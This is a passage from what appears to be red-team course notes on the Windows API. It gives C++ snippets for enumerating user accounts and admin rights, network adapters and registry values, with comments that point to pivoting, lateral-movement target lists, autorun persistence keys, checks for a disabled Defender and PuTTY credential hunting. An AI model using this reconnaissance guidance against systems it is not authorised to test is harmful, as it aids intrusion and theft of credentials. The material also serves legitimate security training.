                          (LPBYTE*)&buf, MAX_PREFERRED_LENGTH,
                          &read, &total, &resume);
        if (ret == NERR_Success || ret == ERROR_MORE_DATA) {
            for (DWORD i = 0; i < read; i++) {
                bool disabled = (buf[i].usri1_flags & UF_ACCOUNTDISABLE) != 0;
                std::wcout << L"  " << buf[i].usri1_name
                           << L"  Priv=" << buf[i].usri1_priv    // 0=Guest 1=User 2=Admin
                           << L"  " << (disabled ? L"[DISABLED]" : L"[ACTIVE]") << L"\n";
            }
            NetApiBufferFree(buf);
            buf = nullptr;
        }
    } while (ret == ERROR_MORE_DATA);
}
// usri1_priv == USER_PRIV_ADMIN (2) → local administrator
// Pass a remote server name (L"\\\\192.168.1.5") to enumerate remote users (requires admin)
```

## Network Interface Enumeration

### GetAdaptersInfo — IP, MAC, Gateway, DHCP

```cpp
#include <windows.h>
#include <iphlpapi.h>
#include <iostream>
#pragma comment(lib, "iphlpapi.lib")

void EnumNetworkInterfaces() {
    ULONG bufLen = 0;
    GetAdaptersInfo(nullptr, &bufLen);       // get required size

    std::vector<BYTE> buf(bufLen);
    auto* adap = (IP_ADAPTER_INFO*)buf.data();

    if (GetAdaptersInfo(adap, &bufLen) != ERROR_SUCCESS) {
        std::cerr << "[-] GetAdaptersInfo failed\n";
        return;
    }

    for (IP_ADAPTER_INFO* a = adap; a; a = a->Next) {
        // Format MAC address
        char mac[18] = {};
        snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
                 a->Address[0], a->Address[1], a->Address[2],
                 a->Address[3], a->Address[4], a->Address[5]);

        std::cout << "Adapter: " << a->Description << "\n"
                  << "  MAC:     " << mac << "\n"
                  << "  IP:      " << a->IpAddressList.IpAddress.String << "\n"
                  << "  Mask:    " << a->IpAddressList.IpMask.String << "\n"
                  << "  Gateway: " << a->GatewayList.IpAddress.String << "\n"
                  << "  DHCP:    " << (a->DhcpEnabled ? "Yes" : "No") << "\n\n";
    }
}
// Dual-homed hosts (two adapters in different subnets) are pivot opportunities
// Internal ranges (10.x, 172.16-31.x, 192.168.x) found here feed the lateral-move target list
```

## Registry Access

### RegOpenKeyEx / RegQueryValueEx — Persistence & Recon

```cpp
#include <windows.h>
#include <iostream>

void ReadRegistryValue(HKEY hive, LPCWSTR subkey, LPCWSTR valueName) {
    HKEY hKey;
    if (RegOpenKeyExW(hive, subkey,
                      0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        std::wcerr << L"[-] RegOpenKeyEx failed: " << GetLastError() << L"\n";
        return;
    }

    DWORD type = 0, size = 0;
    RegQueryValueExW(hKey, valueName, nullptr, &type, nullptr, &size);

    std::vector<BYTE> buf(size);
    if (RegQueryValueExW(hKey, valueName, nullptr, &type,
                         buf.data(), &size) == ERROR_SUCCESS) {
        if (type == REG_SZ || type == REG_EXPAND_SZ) {
            std::wcout << L"  Value: " << (LPCWSTR)buf.data() << L"\n";
        } else {
            std::cout << "  Binary/DWORD value (" << size << " bytes)\n";
        }
    }
    RegCloseKey(hKey);
}

// Persistence — check AutoRun locations:
// HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
// HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

// Security posture — check Defender/UAC status:
// HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection
//   DisableRealtimeMonitoring = 1 → Defender disabled

// Credential hunting — Putty saved sessions:
// HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions\*
//   HostName, UserName, PublicKeyFile
```

## Resources

- Windows API for Red Team - Introduction (course material)
- Windows-API-for-Red-Team — `github.com/WesleyWong420/Windows-API-for-Red-Team`
- Microsoft Win32 API docs — `learn.microsoft.com/en-us/windows/win32/api/`
- MalAPI.io — Windows API categorized by offensive use — `malapi.io`
- Malware Development — `github.com/cocomelonc/meow`
- Process Injection Techniques — `github.com/RedTeamOperations/Advanced-Process-Injection-Workshop`
- Sektor7 Malware Development Essentials — `institute.sektor7.net`
- VX-Underground Windows API collection — `github.com/vxunderground`
